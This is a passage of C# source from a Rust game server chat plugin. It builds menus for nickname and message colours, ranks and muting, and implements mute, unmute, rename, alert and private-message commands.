            }, ELEMENT_SETTINGS);

            CuiHelper.AddUi(player, container);
        }
        #endregion

        #region NickSetting
        public void UI_NickSetting(BasePlayer player)
        {
            CuiElementContainer container = new CuiElementContainer();
            CuiHelper.DestroyUi(player, ELEMENT_SETTINGS);
            CuiHelper.DestroyUi(player, MUTE_MENU_PARENT);
            CuiHelper.DestroyUi(player, PANEL_ACTION_HELPER);

            var Interface = config.InterfaceSetting;
            var ColorList = config.NickColorList;
            float FadeInGlobal = Interface.FadeIn;

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0.5020834 0.1148148", AnchorMax = "0.8150954 0.8814815" },
                Image = { FadeIn = FadeInGlobal, Color = HexToRustFormat(Interface.TwoMainColor), Material = "assets/content/ui/uibackgroundblur.mat" }
            }, MAIN_PARENT, ELEMENT_SETTINGS);

            int x = 0, y = 0, i = 0;
            foreach (var ElementColor in ColorList)
            {
                if (!permission.UserHasPermission(player.UserIDString, ElementColor.Permissions)) continue;
                string LockStatus = "assets/icons/unlock.png";

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = $"{0 + (x * 0.525)} {0.8514473 - (y * 0.1)}", AnchorMax = $"{0.4708602 + (x * 0.525)} {0.9245502 - (y * 0.1)}" },
                    Button = { FadeIn = FadeInGlobal, Command = $"iq_chat action nick {ElementColor.Argument} {ElementColor.Permissions}", Color = HexToRustFormat(config.InterfaceSetting.ButtonColor), Material = "assets/content/ui/uibackgroundblur.mat"},
                    Text = { FadeIn = FadeInGlobal, Text = $"<color={ElementColor.Argument}>{player.displayName}</color>", FontSize = 17, Color = HexToRustFormat(Interface.LabelColor), Align = TextAnchor.MiddleCenter }
                }, ELEMENT_SETTINGS, $"BUTTON_{i}");

                container.Add(new CuiElement
                {
                    Parent = $"BUTTON_{i}",
                    Components =
                    {
                        new CuiImageComponent { FadeIn = FadeInGlobal,  Color = HexToRustFormat(Interface.LabelColor), Sprite = LockStatus },
                        new CuiRectTransformComponent { AnchorMin = "0.03887215 0.1982514", AnchorMax = "0.1660901 0.7930056" }
                    }
                });

                x++;
                if (x == 2)
                {
                    y++;
                    x = 0;
                }
                i++;
            }

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0.93", AnchorMax = "1 1" },
                Text = { FadeIn = FadeInGlobal, Text = lang.GetMessage("UI_TITLE_NEW_NICK_COLOR_ELEMENT", this, player.UserIDString), Color = HexToRustFormat(Interface.LabelColor), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter}
            }, ELEMENT_SETTINGS);

            CuiHelper.AddUi(player, container);
        }
        #endregion

        #region ColorSetting
        public void UI_TextSetting(BasePlayer player)
        {
            CuiElementContainer container = new CuiElementContainer();
            CuiHelper.DestroyUi(player, ELEMENT_SETTINGS);
            CuiHelper.DestroyUi(player, MUTE_MENU_PARENT);
            CuiHelper.DestroyUi(player, PANEL_ACTION_HELPER);

            var Interface = config.InterfaceSetting;
            var ColorList = config.MessageColorList;
            float FadeInGlobal = Interface.FadeIn;

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0.5020834 0.1148148", AnchorMax = "0.8150954 0.8814815" },
                Image = { FadeIn = FadeInGlobal, Color = HexToRustFormat(Interface.TwoMainColor), Material = "assets/content/ui/uibackgroundblur.mat" }
            }, MAIN_PARENT, ELEMENT_SETTINGS);

            int x = 0, y = 0, i = 0;
            foreach (var ElementColor in ColorList)
            {
                if (!permission.UserHasPermission(player.UserIDString, ElementColor.Permissions)) continue;
                string LockStatus = "assets/icons/unlock.png";

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = $"{0 + (x * 0.525)} {0.8514473 - (y * 0.1)}", AnchorMax = $"{0.4708602 + (x * 0.525)} {0.9245502 - (y * 0.1)}" },
                    Button = { FadeIn = FadeInGlobal, Command = $"iq_chat action chat {ElementColor.Argument} {ElementColor.Permissions}", Color = HexToRustFormat(config.InterfaceSetting.ButtonColor), Material = "assets/content/ui/uibackgroundblur.mat" },
                    Text = { FadeIn = FadeInGlobal, Text = $"<color={ElementColor.Argument}>Сообщение</color>", Align = TextAnchor.MiddleCenter }
                }, ELEMENT_SETTINGS, $"BUTTON_{i}");

                container.Add(new CuiElement
                {
                    Parent = $"BUTTON_{i}",
                    Components =
                    {
                        new CuiImageComponent { FadeIn = FadeInGlobal,  Color = HexToRustFormat(Interface.LabelColor), Sprite = LockStatus },
                        new CuiRectTransformComponent { AnchorMin = "0.03887215 0.1982514", AnchorMax = "0.1660901 0.7930056" }
                    }
                });
                x++;
                if (x == 2)
                {
                    y++;
                    x = 0;
                }
            }

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0.93", AnchorMax = "1 1" },
                Text = { FadeIn = FadeInGlobal, Text = lang.GetMessage("UI_TITLE_NEW_MESSAGE_COLOR_ELEMENT", this, player.UserIDString), Color = HexToRustFormat(Interface.LabelColor), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter}
            }, ELEMENT_SETTINGS);

            CuiHelper.AddUi(player, container);
        }
        #endregion

        #region RankSetting
        public void UI_RankSettings(BasePlayer player)
        {
            CuiElementContainer container = new CuiElementContainer();
            CuiHelper.DestroyUi(player, ELEMENT_SETTINGS);
            CuiHelper.DestroyUi(player, MUTE_MENU_PARENT);
            CuiHelper.DestroyUi(player, PANEL_ACTION_HELPER);

            var Interface = config.InterfaceSetting;
            List<string> RankKeys = IQRankListKey(player.userID);
            float FadeInGlobal = Interface.FadeIn;

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0.5020834 0.1148148", AnchorMax = "0.8150954 0.8814815" },
                Image = { FadeIn = FadeInGlobal, Color = HexToRustFormat(Interface.TwoMainColor), Material = "assets/content/ui/uibackgroundblur.mat" }
            }, MAIN_PARENT, ELEMENT_SETTINGS);

            int x = 0, y = 0, i = 0;
            foreach (var ElementRank in RankKeys.Where(r => IQRankUserAcces(player.userID, r)))
            {
                string LockStatus = "assets/icons/unlock.png";
                string RankName = IQRankGetNameRankKey(ElementRank);
                if (String.IsNullOrWhiteSpace(RankName)) continue;

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = $"{0 + (x * 0.525)} {0.8514473 - (y * 0.1)}", AnchorMax = $"{0.4708602 + (x * 0.525)} {0.9245502 - (y * 0.1)}" },
                    Button = { FadeIn = FadeInGlobal, Command = $"iq_chat action rank {ElementRank}", Color = HexToRustFormat(config.InterfaceSetting.ButtonColor), Material = "assets/content/ui/uibackgroundblur.mat" },
                    Text = { FadeIn = FadeInGlobal, Text = $"{RankName}", Align = TextAnchor.MiddleCenter }
                }, ELEMENT_SETTINGS, $"BUTTON_{i}");

                container.Add(new CuiElement
                {
                    Parent = $"BUTTON_{i}",
                    Components =
                    {
                        new CuiImageComponent { FadeIn = FadeInGlobal,  Color = HexToRustFormat(Interface.LabelColor), Sprite = LockStatus },
                        new CuiRectTransformComponent { AnchorMin = "0.03887215 0.1982514", AnchorMax = "0.1660901 0.7930056" }
                    }
                });
                x++;
                if (x == 2)
                {
                    y++;
                    x = 0;
                }
            }

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0.93", AnchorMax = "1 1" },
                Text = { FadeIn = FadeInGlobal, Text = lang.GetMessage("UI_TITLE_NEW_MESSAGE_RANK_ELEMENT", this, player.UserIDString), Color = HexToRustFormat(Interface.LabelColor), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter }
            }, ELEMENT_SETTINGS);

            CuiHelper.AddUi(player, container);
        }
        #endregion

        #region MuteMenu
        public void UI_MuteMenu(BasePlayer player, string TargetName = "")
        {
            CuiElementContainer container = new CuiElementContainer();
            CuiHelper.DestroyUi(player, MUTE_MENU_PARENT);
            CuiHelper.DestroyUi(player, ELEMENT_SETTINGS);
            CuiHelper.DestroyUi(player, PANEL_ACTION_HELPER);

            var Interface = config.InterfaceSetting;
            float FadeInGlobal = Interface.FadeIn;

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0.1546875 0.1148148", AnchorMax = "0.8150954 0.8814815" },
                Image = { FadeIn = FadeInGlobal, Color = HexToRustFormat(Interface.TwoMainColor) }
            }, MAIN_PARENT, MUTE_MENU_PARENT);

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0.9227053", AnchorMax = "1 1" },
                Text = { FadeIn = FadeInGlobal, Text = lang.GetMessage("UI_MUTE_PANEL_TITLE", this, player.UserIDString), Color = HexToRustFormat(Interface.LabelColor), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter }
            },  MUTE_MENU_PARENT);

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0.898551", AnchorMax = "1 0.9456524" },
                Text = { FadeIn = FadeInGlobal, Text = lang.GetMessage("UI_MUTE_PANEL_TITLE_ACTION", this, player.UserIDString), Color = HexToRustFormat(Interface.LabelColor), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter }
            }, MUTE_MENU_PARENT);

            string SearchName = "";
            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0 0.8417874", AnchorMax = "1 0.8961352" },
                Image = { FadeIn = FadeInGlobal, Color = HexToRustFormat(Interface.ButtonColor) }
            }, MUTE_MENU_PARENT, MUTE_MENU_PARENT + ".Input");

            container.Add(new CuiElement
            {
                Parent = MUTE_MENU_PARENT + ".Input",
                Name = MUTE_MENU_PARENT + ".Input.Current",
                Components =
                {
                    new CuiInputFieldComponent { Text = SearchName, FontSize = 14,Command = $"mute_search {SearchName}", Align = TextAnchor.MiddleCenter, Color = HexToRustFormat("#ffffffFF"), CharsLimit = 15},
                    new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1" }
                }
            });

            int x = 0; int y = 0;
            foreach (var pList in BasePlayer.activePlayerList.Where(i => i.displayName.ToLower().Contains(TargetName.ToLower())))
            {
                string LockStatus = ChatSettingUser[pList.userID].MuteChatTime > CurrentTime() ? "assets/icons/lock.png" :
                                    ChatSettingUser[pList.userID].MuteVoiceTime > CurrentTime() ? "assets/icons/lock.png" : "assets/icons/unlock.png";
                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = $"{0.006797731 + (x * 0.165)} {0.7838164 - (y * 0.057)}", AnchorMax = $"{0.1661653 + (x * 0.165)} {0.8309178 - (y * 0.057)}" },
                    Button = { FadeIn = FadeInGlobal, Command = $"iq_chat mute actionmenu {pList.userID}", Color = HexToRustFormat(Interface.ButtonColor) },
                    Text = { FadeIn = FadeInGlobal, Text = "", Align = TextAnchor.MiddleCenter }
                }, MUTE_MENU_PARENT, $"BUTTON{player.userID}");

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0.1611373 0", AnchorMax = "1 1" },
                    Text = { FadeIn = FadeInGlobal, Text = pList.displayName.Replace(" ", ""), FontSize = 12, Color = HexToRustFormat(Interface.LabelColor), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleLeft }
                }, $"BUTTON{player.userID}");

                container.Add(new CuiElement
                {
                    Parent = $"BUTTON{player.userID}",
                    Components =
                    {
                        new CuiImageComponent { FadeIn = FadeInGlobal,  Color = HexToRustFormat(Interface.LabelColor), Sprite = LockStatus },
                        new CuiRectTransformComponent { AnchorMin = "0.02369668 0.2051285", AnchorMax = "0.1374408 0.820514" }
                    }
                });

                x++;
                if (y == 12 && x == 6) break;

                if (x == 6)
                {
                    y++;
                    x = 0;
                }

            };

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.02870133 0.05434785", AnchorMax = "0.3300647 0.08333336" },
                Text = { FadeIn = FadeInGlobal, Text = lang.GetMessage("UI_MUTE_PANEL_TITLE_HELPS_LOCK",this, player.UserIDString), FontSize = 10, Color = HexToRustFormat(Interface.LabelColor), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleLeft }
            },  MUTE_MENU_PARENT);

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.02870133 0.01570053", AnchorMax = "0.3300647 0.04468608" },
                Text = { FadeIn = FadeInGlobal, Text = lang.GetMessage("UI_MUTE_PANEL_TITLE_HELPS_UNLOCK", this, player.UserIDString), FontSize = 10, Color = HexToRustFormat(Interface.LabelColor), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleLeft }
            }, MUTE_MENU_PARENT);

            container.Add(new CuiElement
            {
                Parent = MUTE_MENU_PARENT,
                Components =
                    {
                        new CuiImageComponent {FadeIn = FadeInGlobal,   Color = HexToRustFormat(Interface.LabelColor), Sprite = "assets/icons/lock.png" },
                        new CuiRectTransformComponent { AnchorMin = "0.006797716 0.05434785", AnchorMax = "0.02492483 0.08333336" }
                    }
            });

            container.Add(new CuiElement
            {
                Parent = MUTE_MENU_PARENT,
                Components =
                    {
                        new CuiImageComponent { FadeIn = FadeInGlobal,  Color = HexToRustFormat(Interface.LabelColor), Sprite = "assets/icons/unlock.png" },
                        new CuiRectTransformComponent { AnchorMin = "0.006797716 0.01449281", AnchorMax = "0.02492483 0.04347835" }
                    }
            });

            CuiHelper.AddUi(player, container);
        }
        #endregion

        #region MuteAction
        
        public void UI_MuteTakeAction(BasePlayer player,ulong userID)
        {
            CuiElementContainer container = new CuiElementContainer();
            CuiHelper.DestroyUi(player, PANEL_ACTION_HELPER);
            var Interface = config.InterfaceSetting;
            float FadeInGlobal = Interface.FadeIn;

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0.01197916 0.1148148", AnchorMax = "0.1505208 0.8814214" },  
                Image = { FadeIn = FadeInGlobal, Color = HexToRustFormat(Interface.TwoMainColor), Material = "assets/content/ui/uibackgroundblur.mat" }
            },  MAIN_PARENT, PANEL_ACTION_HELPER);

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0.919082", AnchorMax = "1 1" },
                Text = { FadeIn = FadeInGlobal, Text = lang.GetMessage("UI_MUTE_TAKE_ACTION_PANEL", this, player.UserIDString), Color = HexToRustFormat(Interface.LabelColor), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter }
            },  PANEL_ACTION_HELPER);

            string LockStatus = ChatSettingUser[userID].MuteChatTime > CurrentTime() ? "assets/icons/unlock.png" :
                    ChatSettingUser[userID].MuteVoiceTime > CurrentTime() ? "assets/icons/unlock.png" : "assets/icons/lock.png";

            string ButtonChat = ChatSettingUser[userID].MuteChatTime > CurrentTime() ?  "UI_MUTE_TAKE_ACTION_CHAT_UNMUTE" : "UI_MUTE_TAKE_ACTION_CHAT";
            string ButtonVoice = ChatSettingUser[userID].MuteVoiceTime > CurrentTime() ? "UI_MUTE_TAKE_ACTION_VOICE_UNMUTE" : "UI_MUTE_TAKE_ACTION_VOICE";
            string ButtonCommandChat = ChatSettingUser[userID].MuteChatTime > CurrentTime() ? $"iq_chat mute action {userID} unmutechat" : $"iq_chat mute action {userID} mute mutechat";
            string ButtonCommandVoice = ChatSettingUser[userID].MuteVoiceTime > CurrentTime() ? $"iq_chat mute action {userID} unmutevoice" : $"iq_chat mute action {userID} mute mutevoice";

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0 0.8357491", AnchorMax = "0.903084 0.8961352" },
                Button = { FadeIn = FadeInGlobal, Command = ButtonCommandChat, Color = HexToRustFormat(Interface.ButtonColor), Material = "assets/content/ui/uibackgroundblur.mat"},
                Text = { FadeIn = FadeInGlobal, Text = "",  Align = TextAnchor.MiddleCenter }
            },  PANEL_ACTION_HELPER, "CHAT");

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.1790024 0", AnchorMax = "1 1" },
                Text = { FadeIn = FadeInGlobal, Text = lang.GetMessage(ButtonChat, this, player.UserIDString), FontSize = 10, Color = HexToRustFormat(Interface.LabelColor), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleLeft }
            }, $"CHAT");

            container.Add(new CuiElement
            {
                Parent = $"CHAT",
                Components =
                    {
                        new CuiImageComponent { FadeIn = FadeInGlobal,  Color = HexToRustFormat(Interface.LabelColor), Sprite = LockStatus },
                        new CuiRectTransformComponent { AnchorMin = "0.02369668 0.2051285", AnchorMax = "0.1374408 0.820514" }
                    }
            });

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0 0.7620788", AnchorMax = "0.903084 0.8224649" },
                Button = { FadeIn = FadeInGlobal, Command = ButtonCommandVoice, Color = HexToRustFormat(Interface.ButtonColor), Material = "assets/content/ui/uibackgroundblur.mat"},
                Text = { FadeIn = FadeInGlobal, Text = "", Align = TextAnchor.MiddleCenter }
            },  PANEL_ACTION_HELPER, "VOICE");

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.1790024 0", AnchorMax = "1 1" },
                Text = { FadeIn = FadeInGlobal, Text = lang.GetMessage(ButtonVoice, this, player.UserIDString), FontSize = 10, Color = HexToRustFormat(Interface.LabelColor), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleLeft }
            }, $"VOICE");

            container.Add(new CuiElement
            {
                Parent = $"VOICE",
                Components =
                    {
                        new CuiImageComponent { FadeIn = FadeInGlobal, Color = HexToRustFormat(Interface.LabelColor), Sprite = LockStatus },
                        new CuiRectTransformComponent { AnchorMin = "0.02369668 0.2051285", AnchorMax = "0.1374408 0.820514" }
                    }
            });

            CuiHelper.AddUi(player, container);
        }

        #endregion

        #region ReasonMute
        void UI_ReasonMute(BasePlayer player,ulong userID, string MuteFormat)
        {
            CuiElementContainer container = new CuiElementContainer();
            var Interface = config.InterfaceSetting;
            float FadeInGlobal = Interface.FadeIn;

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0.6702939", AnchorMax = "1 0.7512119" },
                Text = { FadeIn = FadeInGlobal, Text = lang.GetMessage("UI_MUTE_TAKE_REASON_TITLE", this, player.UserIDString), Color = HexToRustFormat(Interface.LabelColor), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter }
            },  PANEL_ACTION_HELPER);

            int i = 0;
            foreach(var Reason in config.ReasonListChat)
            {           
                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = $"0 {0.5942072 - (i * 0.07)}", AnchorMax = $"0.903084 {0.6545933 - (i * 0.07)}" },
                    Button = { FadeIn = FadeInGlobal, Command = $"iq_chat mute action {userID} mute_reason {MuteFormat} {i}", Color = HexToRustFormat(Interface.ButtonColor), Material = "assets/content/ui/uibackgroundblur.mat" },
                    Text = { FadeIn = FadeInGlobal, Text = "", Align = TextAnchor.MiddleCenter }
                },  PANEL_ACTION_HELPER, $"BUTTON{i}");

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0.1790024 0", AnchorMax = "1 1" },
                    Text = { FadeIn = FadeInGlobal, Text = Reason.Reason, FontSize = 10, Color = HexToRustFormat(Interface.LabelColor), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleLeft }
                },  $"BUTTON{i}");

                container.Add(new CuiElement
                {
                    Parent = $"BUTTON{i}",
                    Components =
                    {
                        new CuiImageComponent { FadeIn = FadeInGlobal,  Color = HexToRustFormat(Interface.LabelColor), Sprite = "assets/icons/favourite_servers.png" },
                        new CuiRectTransformComponent { AnchorMin = "0.02369668 0.2051285", AnchorMax = "0.1374408 0.820514" }
                    }
                });
                i++;
            }

            CuiHelper.AddUi(player, container);
        }

        #endregion

        #region UpdateLabel
        public void UpdateLabel(BasePlayer player, SettingUser DataPlayer, string Rank = "")
        {
            CuiElementContainer container = new CuiElementContainer();
            CuiHelper.DestroyUi(player, "UPDATE_LABEL");

            string Prefix = "";
            if (config.MessageSetting.MultiPrefix)
            {
                if (DataPlayer.MultiPrefix != null)
                    for (int i = 0; i < DataPlayer.MultiPrefix.Count; i++)
                        Prefix += DataPlayer.MultiPrefix[i];
            }
            else Prefix = DataPlayer.ChatPrefix;
            string ResultNick = !String.IsNullOrEmpty(Rank) ? $"<b>[{Rank}] {Prefix}<color={DataPlayer.NickColor}>{player.displayName}</color> : <color={DataPlayer.MessageColor}> я лучший</color></b>" : $"<b>{Prefix}<color={DataPlayer.NickColor}>{player.displayName}</color> : <color={DataPlayer.MessageColor}> я лучший</color></b>";

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 0.07367153" },
                Text = { FadeIn = config.InterfaceSetting.FadeIn, Text = $"{ResultNick}", FontSize = 14, Align = TextAnchor.MiddleCenter, Font = "robotocondensed-bold.ttf"}
            },  ELEMENT_SETTINGS, "UPDATE_LABEL");

            CuiHelper.AddUi(player, container);
        }
        #endregion

        #region UIAlert
        void UIAlert(BasePlayer player, string Message)
        {
            if (XDNotifications && config.ReferenceSetting.XDNotificationsSettings.UseXDNotifications)
            {
                AddNotify(player, lang.GetMessage("UI_ALERT_TITLE", this, player.UserIDString), Message);
                return;
            }
            CuiElementContainer container = new CuiElementContainer();
            CuiHelper.DestroyUi(player, MAIN_ALERT_UI);
            var Interface = config.InterfaceSetting;
            var Transform = Interface.AlertInterfaceSetting;
            float FadeInGlobal = Interface.FadeIn;

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = Transform.AnchorMin, AnchorMax = Transform.AnchorMax, OffsetMin = Transform.OffsetMin, OffsetMax = Transform.OffsetMax },
                Image = { FadeIn = FadeInGlobal, Color = HexToRustFormat(config.InterfaceSetting.ButtonColor), Material = "assets/content/ui/uibackgroundblur.mat" }
            }, "Overlay", MAIN_ALERT_UI);

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0.025 0.5523812", AnchorMax = "0.1 0.8952214" },  //
                Image = { FadeIn = FadeInGlobal, Color = HexToRustFormat(Interface.MainColor), Sprite = "assets/icons/upgrade.png" }
            }, MAIN_ALERT_UI);

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.1125001 0.5037036", AnchorMax = "1 1" },
                Text = { FadeIn = FadeInGlobal, Text = lang.GetMessage("UI_ALERT_TITLE", this, player.UserIDString), Color = HexToRustFormat(Interface.LabelColor), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleLeft }
            }, MAIN_ALERT_UI);

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 0.5259256" },
                Text = { FadeIn = FadeInGlobal, Text = $"{Message}", FontSize = 12, Color = HexToRustFormat(Interface.LabelColor), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter }
            }, MAIN_ALERT_UI);

            CuiHelper.AddUi(player, container);

            timer.Once(config.MessageSetting.TimeDeleteAlertUI, () =>
            {
                CuiHelper.DestroyUi(player, MAIN_ALERT_UI);
            });
        }
        #endregion

        #endregion

        #region Command

        #region UsingCommand
        [ConsoleCommand("mute")]
        void MuteCustomAdmin(ConsoleSystem.Arg arg)
        {
            if (arg == null || arg.Args == null || arg.Args.Length != 3 || arg.Args.Length > 3)
            {
                PrintWarning("Неверный синтаксис,используйте : mute Steam64ID Причина Время(секунды)");
                return;
            }
            ulong userID = ulong.Parse(arg.Args[0]);
            if (!userID.IsSteamId())
            {
                PrintWarning("Неверный Steam64ID");
                return;
            }
            string Reason = arg.Args[1];
            string TimeMute = arg.Args[2];
            BasePlayer target = BasePlayer.FindByID(userID);
            if (target == null)
            {
                PrintWarning("Такого игрока нет на сервере");
                return;
            }
            MutePlayer(target, "mutechat", 0, Reason, TimeMute);
            Puts("Успешно");
        }
        [ConsoleCommand("unmute")]
        void UnMuteCustomAdmin(ConsoleSystem.Arg arg)
        {
            if (arg == null || arg.Args == null || arg.Args.Length != 1 || arg.Args.Length > 1)
            {
                PrintWarning("Неверный синтаксис,используйте : unmute Steam64ID");
                return;
            }
            ulong userID = ulong.Parse(arg.Args[0]);
            if (!userID.IsSteamId())
            {
                PrintWarning("Неверный Steam64ID");
                return;
            }
            BasePlayer target = BasePlayer.FindByID(userID);
            if (target == null)
            {
                PrintWarning("Такого игрока нет на сервере");
                return;
            }
            ChatSettingUser[target.userID].MuteChatTime = 0;
            ReplyBroadcast(GetLang("FUNC_MESSAGE_UNMUTE_CHAT",target.UserIDString, "Администратор", target.displayName));
            Puts("Успешно");
        }
        [ChatCommand("text")]
        void ChatCommandMenu(BasePlayer player) => UI_MainMenu(player);

        [ChatCommand("alert")]
        void ChatAlertPlayers(BasePlayer player, string cmd, string[] arg) => Alert(player, arg);

        [ChatCommand("alertui")]
        void ChatAlertPlayersUI(BasePlayer player, string cmd, string[] arg) => AlertUI(player, arg);

        [ChatCommand("rename")]
        void RenameMetods(BasePlayer player, string cmd, string[] arg)
        {
            if (arg.Length == 0 || arg == null)
            {
                ReplySystem(Chat.ChatChannel.Global, player, lang.GetMessage("COMMAND_RENAME_NOTARG", this, player.UserIDString));
                return;
            }
            string NewName = "";
            foreach (var name in arg)
                NewName += " " + name;
            RenameFunc(player, NewName);
        }

        #region PM

        [ChatCommand("pm")]
        void PmChat(BasePlayer player, string cmd, string[] arg)
        {
            if (!config.MessageSetting.PMActivate) return;
            if (arg.Length == 0 || arg == null)
            {
                ReplySystem(Chat.ChatChannel.Global, player, lang.GetMessage("COMMAND_PM_NOTARG", this, player.UserIDString));
                return;
            }
            string NameUser = arg[0];
            if (config.ReferenceSetting.IQFakeActiveSettings.UseIQFakeActive)
                if (IQFakeActive)
                    if (IsFake(NameUser))
                    {
                        ReplySystem(Chat.ChatChannel.Global, player, GetLang("COMMAND_PM_SUCCESS", player.UserIDString, string.Join(" ", arg.ToArray().ToArray()).Replace(NameUser, "")));
                        return;
                    }
            BasePlayer TargetUser = FindPlayer(NameUser);
            if (TargetUser == null || NameUser == null)
            {
                ReplySystem(Chat.ChatChannel.Global, player, lang.GetMessage("COMMAND_PM_NOT_USER", this, player.UserIDString));
                return;
            }
            if (config.MessageSetting.IgnoreUsePM)
            {
                if (ChatSettingUser[TargetUser.userID].IgnoredUsers.Contains(player.userID))
                {
                    ReplySystem(Chat.ChatChannel.Global, player, lang.GetMessage("IGNORE_NO_PM", this, player.UserIDString));
                    return;
                }
                if (ChatSettingUser[player.userID].IgnoredUsers.Contains(TargetUser.userID))
                {
                    ReplySystem(Chat.ChatChannel.Global, player, lang.GetMessage("IGNORE_NO_PM_ME", this, player.UserIDString));
                    return;
                }
            }
            var argList = arg.ToArray();
            string Message = string.Join(" ", argList.ToArray()).Replace(NameUser, "");
            if (Message.Length > 125) return;
            if (Message.Length <= 0 || Message == null)
            {
                ReplySystem(Chat.ChatChannel.Global, player, lang.GetMessage("COMMAND_PM_NOT_NULL_MSG", this, player.UserIDString));
                return;
            }

            PMHistory[TargetUser] = player;
            PMHistory[player] = TargetUser;
            var DisplayNick = AdminSetting.RenameList.ContainsKey(player.userID) ? AdminSetting.RenameList[player.userID] : player.displayName;

            ReplySystem(Chat.ChatChannel.Global, TargetUser, GetLang("COMMAND_PM_SEND_MSG", player.UserIDString, DisplayNick, Message));
            ReplySystem(Chat.ChatChannel.Global, player, GetLang("COMMAND_PM_SUCCESS", player.UserIDString, Message));
            Effect.server.Run(config.MessageSetting.SoundPM, TargetUser.GetNetworkPosition());
            Log($"ЛИЧНЫЕ СООБЩЕНИЯ : {player.userID}({DisplayNick}) отправил сообщение игроку - {TargetUser.displayName}\nСООБЩЕНИЕ : {Message}");

            RCon.Broadcast(RCon.LogType.Chat, new Chat.ChatEntry
            {
                Message = $"ЛИЧНЫЕ СООБЩЕНИЯ : {DisplayNick}({player.userID}) -> {TargetUser.displayName} : СООБЩЕНИЕ : {Message}",
                UserId = player.UserIDString,
                Username = player.displayName,
                Channel = Chat.ChatChannel.Global,
                Time = (DateTime.UtcNow.Hour * 3600) + (DateTime.UtcNow.Minute * 60),
                Color = "#3f4bb8",
            });
            PrintWarning($"ЛИЧНЫЕ СООБЩЕНИЯ : {DisplayNick}({player.userID}) -> {TargetUser.displayName} : СООБЩЕНИЕ : {Message}");
        }

        [ChatCommand("r")]
        void RChat(BasePlayer player, string cmd, string[] arg)
        {
            if (!config.MessageSetting.PMActivate) return;
            if (arg.Length == 0 || arg == null)
            {
                ReplySystem(Chat.ChatChannel.Global, player, lang.GetMessage("COMMAND_R_NOTARG", this, player.UserIDString));
                return;
            }
            if (!PMHistory.ContainsKey(player))
            {
                ReplySystem(Chat.ChatChannel.Global, player, lang.GetMessage("COMMAND_R_NOTMSG", this, player.UserIDString));
                return;
            }
            BasePlayer RetargetUser = PMHistory[player];
            if (RetargetUser == null)
            {
                ReplySystem(Chat.ChatChannel.Global, player, lang.GetMessage("COMMAND_PM_NOT_USER", this, player.UserIDString));
                return;
            }
            if (config.MessageSetting.IgnoreUsePM)
            {
                if (ChatSettingUser[RetargetUser.userID].IgnoredUsers.Contains(player.userID))
                {
                    ReplySystem(Chat.ChatChannel.Global, player, lang.GetMessage("IGNORE_NO_PM", this, player.UserIDString));
                    return;
                }
                if (ChatSettingUser[player.userID].IgnoredUsers.Contains(RetargetUser.userID))
                {
                    ReplySystem(Chat.ChatChannel.Global, player, lang.GetMessage("IGNORE_NO_PM_ME", this, player.UserIDString));
                    return;
                }
            }
            string Message = string.Join(" ", arg.ToArray());
            if (Message.Length > 125) return;
            if (Message.Length <= 0 || Message == null)
            {
                ReplySystem(Chat.ChatChannel.Global, player, lang.GetMessage("COMMAND_PM_NOT_NULL_MSG", this, player.UserIDString));
                return;
            }
            PMHistory[RetargetUser] = player;
            var DisplayNick = AdminSetting.RenameList.ContainsKey(player.userID) ? AdminSetting.RenameList[player.userID] : player.displayName;

            ReplySystem(Chat.ChatChannel.Global, RetargetUser, GetLang("COMMAND_PM_SEND_MSG", player.UserIDString, DisplayNick, Message));
            ReplySystem(Chat.ChatChannel.Global, player, GetLang("COMMAND_PM_SUCCESS", player.UserIDString, Message));

            Effect.server.Run(config.MessageSetting.SoundPM, RetargetUser.GetNetworkPosition());
